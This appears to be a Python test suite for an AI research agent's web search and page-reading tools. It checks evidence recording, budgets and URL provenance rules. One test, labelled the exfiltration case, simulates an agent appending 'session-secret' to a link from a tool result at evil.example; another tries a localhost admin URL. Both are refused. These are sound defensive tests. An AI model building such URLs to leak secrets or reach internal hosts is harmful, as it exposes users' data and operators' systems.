"""P7 step 2: the agent's web tools.

No network: `search_web` and `fetch_page` are replaced at the tool module, so
these tests pin what the agent is told and what is recorded — evidence that
quotes the source verbatim and is private to its reader, per-provider
coverage, the undated-result bucket, the per-run ceilings, paper URLs turned
toward the paper tools, and the rule that only a URL already shown in the
conversation can be opened.
"""

from __future__ import annotations

import json
import os
from datetime import date
from typing import Any
from unittest import mock

from langchain_core.messages import AIMessage, HumanMessage, ToolMessage

from app.services.paper_search.models import PlatformStatus
from app.services.web_search.models import FetchOutcome, WebPage, WebResult, WebSearchOutcome
from tests.test_agent_p2 import AgentP2TestCase

PAGE_MD = (
    "# FlashAttention\n\nFast and memory-efficient exact attention.\n\n"
    "## Installation\n\nRequires CUDA 12.3 and PyTorch 2.2 or later. "
    "Supported GPUs: Ampere, Ada and Hopper.\n\n"
    "## License\n\nBSD 3-Clause.\n\n"
    "## Changelog\n\n" + ("Release notes line. " * 150)
)


def outcome(*results: WebResult, statuses: list[PlatformStatus] | None = None, **kw: Any) -> WebSearchOutcome:
    return WebSearchOutcome(
        results=list(results),
        providers=statuses or [PlatformStatus("Tavily", "ok", count=len(results))],
        **kw,
    )


def result(url: str, snippet: str = "snippet", provider: str = "Tavily", published: str | None = None) -> WebResult:
    return WebResult(url=url, title=f"Title of {url}", snippet=snippet, provider=provider, published_date=published)


class _WebCase(AgentP2TestCase):
    async def asyncSetUp(self) -> None:
        await super().asyncSetUp()
        from app.services.web_search.cache import PAGE_CACHE

        PAGE_CACHE.clear()
        self.addCleanup(PAGE_CACHE.clear)
        patcher = mock.patch("app.agents.tools.web.web_search_enabled", return_value=True)
        patcher.start()
        self.addCleanup(patcher.stop)
        self.state: dict[str, Any] = {"messages": []}

    async def _call(self, tool, **kwargs) -> dict[str, Any]:
        from langchain.tools import ToolRuntime

        runtime = ToolRuntime(
            state=self.state,
            context=self.ctx,
            config={"configurable": {"thread_id": self.ctx.thread_id}},
            stream_writer=lambda _chunk: None,
            tool_call_id="test-call",
            store=None,
            tools=[],
        )
        raw = await tool.ainvoke({**kwargs, "runtime": runtime})
        return json.loads(raw)

    def _search_returns(self, value: WebSearchOutcome) -> mock.AsyncMock:
        fake = mock.AsyncMock(return_value=value)
        patcher = mock.patch("app.agents.tools.web.search_web", fake)
        patcher.start()
        self.addCleanup(patcher.stop)
        return fake

    def _fetch_returns(self, value: FetchOutcome) -> mock.AsyncMock:
        fake = mock.AsyncMock(return_value=value)
        patcher = mock.patch("app.agents.tools.web.fetch_page", fake)
        patcher.start()
        self.addCleanup(patcher.stop)
        return fake

    def _page(self, url: str = "https://github.com/Dao-AILab/flash-attention", markdown: str = PAGE_MD) -> FetchOutcome:
        return FetchOutcome(
            page=WebPage(url=url, markdown=markdown, provider="Tavily", title="flash-attention"),
            attempts=[PlatformStatus("Tavily", "ok", count=len(markdown))],
        )

    def _no_rerank(self) -> None:
        patcher = mock.patch("app.services.web_search.chunking._rerank", mock.AsyncMock(return_value=None))
        patcher.start()
        self.addCleanup(patcher.stop)


class WebSearchToolTests(_WebCase):
    async def test_results_become_verbatim_web_evidence(self) -> None:
        from app.agents.tools import web_search
        from app.services import evidence_service

        long_snippet = "FlashAttention-3 reaches 740 TFLOPs on H100. " * 30
        fake = self._search_returns(outcome(result("https://tridao.me/blog/flash3", long_snippet)))

        out = await self._call(web_search, query="flashattention 3 h100 throughput", start_date="2024-01-01")

        self.assertEqual(out["status"], "ok")
        req = fake.await_args.args[0]
        self.assertEqual(req.start_date, date(2024, 1, 1))
        hit = out["data"]["results"][0]
        # The model sees an excerpt; the evidence keeps the whole snippet.
        self.assertLess(len(hit["snippet"]), len(long_snippet.strip()))
        evidence = await evidence_service.resolve(hit["evidence_id"], owner_id=self.owner)
        self.assertEqual(evidence.source_level.value, "external_web")
        self.assertEqual(evidence.quote, long_snippet.strip())
        self.assertEqual(evidence.source_url, "https://tridao.me/blog/flash3")
        self.assertEqual(evidence.provider, "tavily:search")
        self.assertEqual(evidence.locator.section_path, "Title of https://tridao.me/blog/flash3")
        self.assertIsNone(evidence.locator.page_label)
        self.assertEqual(out["evidence_ids"], [hit["evidence_id"]])
        self.assertEqual(self.ctx.usage.web_searches, 1)

    async def test_same_snippet_for_two_readers_gives_two_citable_ids(self) -> None:
        from app.agents.context import AgentContext
        from app.agents.tools import web_search
        from app.db import agent_repository as repo
        from app.services import evidence_service, identity

        self._search_returns(outcome(result("https://example.org/a", "identical snippet")))
        mine = (await self._call(web_search, query="q"))["data"]["results"][0]["evidence_id"]

        other_owner, _ = await identity.create_principal()
        other_session = await repo.create_session(owner_id=other_owner, language="en")
        self.ctx = AgentContext(owner_id=other_owner, session_id=other_session.session_id, run_id="r2")
        theirs = (await self._call(web_search, query="q"))["data"]["results"][0]["evidence_id"]

        self.assertNotEqual(mine, theirs)
        # Each reader can resolve their own citation.
        self.assertEqual((await evidence_service.resolve(theirs, owner_id=other_owner)).owner_id, other_owner)
        checks = await evidence_service.validate_citations([theirs], owner_id=other_owner)
        self.assertTrue(checks[0].authorized)

    async def test_provider_gaps_make_the_result_partial(self) -> None:
        from app.agents.tools import web_search

        self._search_returns(
            outcome(
                result("https://b.org", provider="Exa"),
                statuses=[PlatformStatus("Tavily", "quota_exhausted"), PlatformStatus("Exa", "ok", count=1)],
            )
        )
        out = await self._call(web_search, query="q")
        self.assertEqual(out["status"], "partial")
        self.assertIn("Tavily (quota_exhausted)", out["note"])
        self.assertEqual(out["data"]["providers"][0], {"provider": "Tavily", "status": "quota_exhausted"})

    async def test_undated_results_are_kept_apart(self) -> None:
        from app.agents.tools import web_search

        self._search_returns(
            outcome(
                result("https://n.org/new", published="2025-03-01"),
                unknown_date=[result("https://n.org/undated")],
            )
        )
        out = await self._call(web_search, query="q", topic="news", start_date="2025-01-01")
        self.assertEqual(out["status"], "partial")
        self.assertEqual([r["url"] for r in out["data"]["results"]], ["https://n.org/new"])
        self.assertEqual([r["url"] for r in out["data"]["unknown_date"]], ["https://n.org/undated"])
        self.assertFalse(out["data"]["unknown_date"][0]["date_known"])
        self.assertIn("unknown_date", out["note"])

    async def test_paper_results_point_to_the_paper_tools(self) -> None:
        from app.agents.tools import web_search

        self._search_returns(outcome(result("https://arxiv.org/abs/2407.08608")))
        out = await self._call(web_search, query="flashattention 3 paper")
        self.assertEqual(out["data"]["results"][0]["paper_identifiers"], {"arxiv_id": "2407.08608"})
        self.assertIn("download_paper", out["note"])

    async def test_nothing_searched_is_an_error_not_an_empty_answer(self) -> None:
        from app.agents.tools import web_search

        self._search_returns(
            outcome(statuses=[PlatformStatus("Tavily", "rate_limited"), PlatformStatus("Exa", "quota_exhausted"), PlatformStatus("Firecrawl", "rate_limited")])
        )
        out = await self._call(web_search, query="q")
        self.assertEqual(out["status"], "error")
        self.assertEqual(out["error"]["code"], "rate_limited")
        self.assertTrue(out["error"]["retryable"])

        self._search_returns(outcome(statuses=[PlatformStatus(p, "skipped_no_key") for p in ("Tavily", "Exa", "Firecrawl")]))
        out = await self._call(web_search, query="q")
        self.assertEqual(out["status"], "unavailable")
        self.assertEqual(self.ctx.usage.web_searches, 1)  # the keyless call cost nothing

    async def test_budget_is_enforced_and_deep_costs_two(self) -> None:
        from app.agents.tools import web_search

        fake = self._search_returns(outcome(result("https://a.org")))
        self.ctx.budget.max_web_searches = 3
        await self._call(web_search, query="q", depth="deep")
        self.assertEqual(self.ctx.usage.web_searches, 2)
        out = await self._call(web_search, query="q", depth="deep")
        self.assertEqual(out["error"]["code"], "budget_exceeded")
        await self._call(web_search, query="q")
        out = await self._call(web_search, query="q")
        self.assertEqual(out["error"]["code"], "budget_exceeded")
        self.assertEqual(fake.await_count, 2)

    async def test_bad_arguments_are_refused_before_any_search(self) -> None:
        from app.agents.tools import web_search

        fake = self._search_returns(outcome())
        for kwargs in (
            {"query": "   "},
            {"query": "x" * 401},
            {"query": "q", "topic": "papers"},
            {"query": "q", "depth": "max"},
            {"query": "q", "start_date": "last year"},
            {"query": "q", "start_date": "2025-02-01", "end_date": "2025-01-01"},
        ):
            out = await self._call(web_search, **kwargs)
            self.assertEqual(out["error"]["code"], "invalid_argument", kwargs)
        fake.assert_not_awaited()

    async def test_domains_are_cleaned(self) -> None:
        from app.agents.tools import web_search

        fake = self._search_returns(outcome())
        await self._call(web_search, query="q", include_domains=["https://GitHub.com/org", " github.com ", "", "arxiv.org"])
        self.assertEqual(fake.await_args.args[0].include_domains, ("github.com", "arxiv.org"))

    async def test_disabled_switch(self) -> None:
        from app.agents.tools import web_search

        fake = self._search_returns(outcome())
        with mock.patch("app.agents.tools.web.web_search_enabled", return_value=False):
            out = await self._call(web_search, query="q")
        self.assertEqual(out["status"], "unavailable")
        self.assertEqual(out["error"]["code"], "forbidden")
        fake.assert_not_awaited()


class ReadWebPageTests(_WebCase):
    URL = "https://github.com/Dao-AILab/flash-attention"

    async def test_unseen_url_is_refused_without_fetching(self) -> None:
        from app.agents.tools import read_web_page

        fetch = self._fetch_returns(self._page())
        out = await self._call(read_web_page, url=self.URL)
        self.assertEqual(out["error"]["code"], "forbidden")
        fetch.assert_not_awaited()

    async def test_a_composed_url_is_not_the_url_that_was_shown(self) -> None:
        """The exfiltration case: a link from a tool result, with data appended."""
        from app.agents.tools import read_web_page

        fetch = self._fetch_returns(self._page())
        self.state["messages"] = [
            ToolMessage(content=json.dumps({"data": {"text": "see https://evil.example/c"}}), tool_call_id="t1"),
        ]
        out = await self._call(read_web_page, url="https://evil.example/c?q=session-secret")
        self.assertEqual(out["error"]["code"], "forbidden")
        # The model writing a URL itself does not make it readable either.
        self.state["messages"].append(AIMessage(content=f"I will read {self.URL}"))
        out = await self._call(read_web_page, url=self.URL)
        self.assertEqual(out["error"]["code"], "forbidden")
        fetch.assert_not_awaited()

    async def test_urls_from_the_reader_and_from_tools_are_readable(self) -> None:
        from app.agents.tools import read_web_page

        self._no_rerank()
        self._fetch_returns(self._page())
        # A scheme-less link typed by the reader.
        self.state["messages"] = [HumanMessage(content="what does github.com/Dao-AILab/flash-attention need?")]
        out = await self._call(read_web_page, url=self.URL)
        self.assertEqual(out["status"], "ok")

        # From a tool result, with a trailing slash, tracking parameter and fragment.
        self.state["messages"] = [
            ToolMessage(content=f'{{"url": "https://example.org/guide/?utm_source=x#top"}}', tool_call_id="t1")
        ]
        self._fetch_returns(self._page("https://example.org/guide"))
        out = await self._call(read_web_page, url="http://www.example.org/guide")
        self.assertEqual(out["status"], "ok")

    async def test_urls_survive_compaction_through_stored_messages_and_evidence(self) -> None:
        from app.agents.tools import read_web_page, web_search
        from app.db import agent_repository as repo
        from app.models.agent_models import MessageRole

        self._no_rerank()
        self._fetch_returns(self._page())
        await repo.append_message(
            session_id=self.session.session_id, role=MessageRole.USER, content=f"Look at {self.URL}."
        )
        self.assertEqual((await self._call(read_web_page, url=self.URL))["status"], "ok")

        # A search result from an earlier turn, no longer in the live state.
        self._search_returns(outcome(result("https://pytorch.org/blog/flash")))
        await self._call(web_search, query="q")
        self.state["messages"] = []
        self._fetch_returns(self._page("https://pytorch.org/blog/flash"))
        self.assertEqual((await self._call(read_web_page, url="https://pytorch.org/blog/flash"))["status"], "ok")

    async def test_question_returns_the_relevant_chunks_as_evidence(self) -> None:
        from app.agents.tools import read_web_page
        from app.services import evidence_service

        self._no_rerank()
        self._fetch_returns(self._page())
        self.state["messages"] = [HumanMessage(content=self.URL)]
        out = await self._call(read_web_page, url=self.URL, question="which CUDA version and GPUs are supported", max_chars=1000)

        self.assertEqual(out["status"], "ok")
        data = out["data"]
        self.assertEqual(data["ranker"], "lexical")
        first = data["chunks"][0]
        self.assertIn("CUDA 12.3", first["text"])
        self.assertEqual(first["heading"], "FlashAttention › Installation")
        self.assertLessEqual(sum(len(c["text"]) for c in data["chunks"]), 1000)
        evidence = await evidence_service.resolve(first["evidence_id"], owner_id=self.owner)
        self.assertEqual(evidence.quote, first["text"])
        self.assertEqual(evidence.locator.section_path, "flash-attention › FlashAttention › Installation")
        self.assertEqual(evidence.provider, "tavily:page")
        self.assertEqual(out["evidence_ids"], [c["evidence_id"] for c in data["chunks"]])

    async def test_paging_by_offset_reuses_the_fetched_page(self) -> None:
        from app.agents.tools import read_web_page

        fetch = self._fetch_returns(self._page())
        self.state["messages"] = [HumanMessage(content=self.URL)]
        first = await self._call(read_web_page, url=self.URL, max_chars=1000)
        self.assertIsNotNone(first["data"]["next_offset"])
        self.assertFalse(first["data"]["cached"])
        second = await self._call(read_web_page, url=self.URL, max_chars=1000, offset=first["data"]["next_offset"])
        self.assertTrue(second["data"]["cached"])
        self.assertEqual(fetch.await_count, 1)
        self.assertEqual(self.ctx.usage.web_fetches, 1)
        self.assertGreater(second["data"]["chunks"][0]["offset"], first["data"]["chunks"][-1]["offset"])

    async def test_paper_urls_go_to_the_paper_tools(self) -> None:
        from app.agents.tools import read_web_page

        fetch = self._fetch_returns(self._page())
        out = await self._call(read_web_page, url="https://arxiv.org/pdf/2407.08608v2")
        self.assertEqual(out["status"], "unavailable")
        self.assertEqual(out["data"]["paper_identifiers"], {"arxiv_id": "2407.08608"})
        fetch.assert_not_awaited()

    async def test_local_addresses_are_refused(self) -> None:
        from app.agents.tools import read_web_page

        fetch = self._fetch_returns(self._page())
        self.state["messages"] = [HumanMessage(content="http://127.0.0.1:8000/api/admin")]
        out = await self._call(read_web_page, url="http://127.0.0.1:8000/api/admin")
        self.assertEqual(out["error"]["code"], "invalid_argument")
        fetch.assert_not_awaited()

    async def test_unreadable_page_and_unreachable_providers_differ(self) -> None:
        from app.agents.tools import read_web_page

        self.state["messages"] = [HumanMessage(content=self.URL)]
        self._fetch_returns(
            FetchOutcome(page=None, attempts=[PlatformStatus("Tavily", "empty", detail="blocked"), PlatformStatus("Exa", "empty"), PlatformStatus("Firecrawl", "empty")])
        )
        out = await self._call(read_web_page, url=self.URL)
        self.assertEqual(out["status"], "unavailable")
        self.assertEqual(len(out["data"]["attempts"]), 3)

        self._fetch_returns(
            FetchOutcome(page=None, attempts=[PlatformStatus("Tavily", "rate_limited"), PlatformStatus("Exa", "quota_exhausted"), PlatformStatus("Firecrawl", "rate_limited")])
        )
        out = await self._call(read_web_page, url=self.URL)
        self.assertEqual(out["status"], "error")
        self.assertEqual(out["error"]["code"], "rate_limited")

    async def test_fetch_budget(self) -> None:
        from app.agents.tools import read_web_page

        fetch = self._fetch_returns(self._page())
        self.state["messages"] = [HumanMessage(content=self.URL)]
        self.ctx.usage.web_fetches = self.ctx.budget.max_web_fetches
        out = await self._call(read_web_page, url=self.URL)
        self.assertEqual(out["error"]["code"], "budget_exceeded")
        fetch.assert_not_awaited()


class ProvenanceExtractionTests(AgentP2TestCase):
    async def test_extract_urls_trims_markdown_and_punctuation(self) -> None:
        from app.services.web_search.provenance import extract_urls

        text = (
            "See [the repo](https://github.com/org/repo). Also (https://en.wikipedia.org/wiki/Foo_(bar)), "
            "and https://a.org/x, plus <https://b.org/y>; and \"https://c.org/z\"."
        )
        self.assertEqual(
            extract_urls(text),
            [
                "https://github.com/org/repo",
                "https://en.wikipedia.org/wiki/Foo_(bar)",
                "https://a.org/x",
                "https://b.org/y",
                "https://c.org/z",
            ],
        )
        self.assertEqual(extract_urls("[https://a.org/x](https://b.org/y)"), ["https://a.org/x", "https://b.org/y"])
        self.assertIn("https://github.com/org/repo", extract_urls("try github.com/org/repo please", bare=True))
        self.assertEqual(extract_urls("version 2.2 of model.py", bare=False), [])


class BudgetSettingsTests(AgentP2TestCase):
    async def test_web_ceilings_come_from_settings_and_do_not_end_the_run(self) -> None:
        from app.agents.context import BudgetUsage, RunBudget
        from app.config import get_settings

        with mock.patch.dict(os.environ, {"AGENT_MAX_WEB_SEARCHES": "4", "AGENT_MAX_WEB_FETCHES": "2"}):
            get_settings.cache_clear()
            budget = RunBudget.from_settings()
        get_settings.cache_clear()
        self.assertEqual((budget.max_web_searches, budget.max_web_fetches), (4, 2))
        self.assertEqual(RunBudget.from_dict(budget.as_dict()).max_web_fetches, 2)

        usage = BudgetUsage(web_searches=4, web_fetches=2)
        self.assertEqual(usage.exceeded(budget), "")
        self.assertEqual(usage.as_dict()["web_searches"], 4)

    async def test_the_agent_offers_the_web_tools(self) -> None:
        from app.agents.harness import model_visible_tool_names
        from app.agents.prompts import build_system_prompt
        from app.agents.tools import ALL_AGENT_TOOLS

        names = set(model_visible_tool_names(ALL_AGENT_TOOLS))
        self.assertTrue({"web_search", "read_web_page"} <= names)
        for language in ("zh", "en"):
            prompt = build_system_prompt(language=language, papers=[], memories=[])
            self.assertIn("read_web_page", prompt)
